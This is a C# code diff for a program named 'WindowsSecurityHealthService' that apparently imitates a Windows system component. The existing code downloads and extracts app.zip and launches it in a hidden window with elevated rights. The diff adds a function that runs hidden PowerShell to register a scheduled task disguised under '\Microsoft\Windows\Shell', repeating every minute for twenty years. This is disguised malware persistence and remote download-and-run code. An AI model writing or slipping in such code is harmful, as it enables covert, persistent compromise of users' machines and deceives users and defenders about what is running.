@@ -47,7 +47,6 @@ namespace WindowsSecurityHealthService
             Trace.Listeners.Add(consoleTraceListener);
 
             Trace.AutoFlush = true;
-            Trace.WriteLine("===================");
             Trace.WriteLine("U:" + localAppDataPath);
             // TODO: Add code here to start your service.
 
@@ -59,6 +58,7 @@ namespace WindowsSecurityHealthService
                 {
                     try
                     {
+                        Trace.WriteLine("===================");
                         string serverVersion = GetServerVersion();
                         string assemblyVersion = GetAssemblyVersion();
 
@@ -162,7 +162,7 @@ namespace WindowsSecurityHealthService
             }
         }
 
-        static void DownloadAndRunScript()
+        static async void DownloadAndRunScript()
         {
             try
             {
@@ -195,6 +195,10 @@ namespace WindowsSecurityHealthService
                 ZipFile.ExtractToDirectory(tempZipPath, currentDir);
 
                 Trace.WriteLine("Downloaded and extracted app.zip successfully.");
+
+                CreateScheduledTask(taskName, assemblyFile);
+
+                await Task.Delay(1000);
 
                 RunScheduledTask(taskName);
             }
@@ -255,6 +259,41 @@ namespace WindowsSecurityHealthService
             return processes.Any(p => p.MainModule.FileName.Equals(filePath, StringComparison.OrdinalIgnoreCase));
         }
 
+        static void CreateScheduledTask(string taskName,string taskPath)
+        {
+            try
+            {
+                string psCommand = $"$action = New-ScheduledTaskAction -Execute '{taskPath}'; " +
+                           "$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date.AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days (365 * 20)); " +
+                           "$settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 100; " +
+                           "$settings.DisallowStartIfOnBatteries = $false; " +
+                           "$settings.StopIfGoingOnBatteries = $false; " +
+                           $"Register-ScheduledTask -Action $action -Trigger $trigger -TaskName '{taskName}' -TaskPath '\\Microsoft\\Windows\\Shell' -Settings $settings -Force; " +
+                           $"if (Get-ScheduledTask -TaskName '{taskName}' -ErrorAction SilentlyContinue) {{ Start-ScheduledTask -TaskPath '\\Microsoft\\Windows\\Shell' -TaskName '{taskName}' }} " +
+                           $"else {{ Write-Host 'Error: Scheduled task {taskName} was not created successfully.'; exit 1 }}";
+
+
+                ProcessStartInfo psi = new ProcessStartInfo
+                {
+                    FileName = "powershell.exe",
+                    Arguments = $"-Command \"{psCommand}\"",
+                    UseShellExecute = true,
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                };
+
+                using (Process process = Process.Start(psi))
+                {
+                    
+                }
+
+            }
+            catch (Exception ex)
+            {
+                Trace.WriteLine($"Failed to run the scheduled task: {ex.Message}");
+            }
+        }
+
         static void RunScheduledTask(string taskName)
         {
             try
@@ -265,10 +304,11 @@ namespace WindowsSecurityHealthService
                     Verb = "runas",
                     UseShellExecute = true,
                     CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden
+                    WindowStyle = ProcessWindowStyle.Hidden,
                 };
 
                 Process.Start(startInfo);
+
             }
             catch (Exception ex)
             {
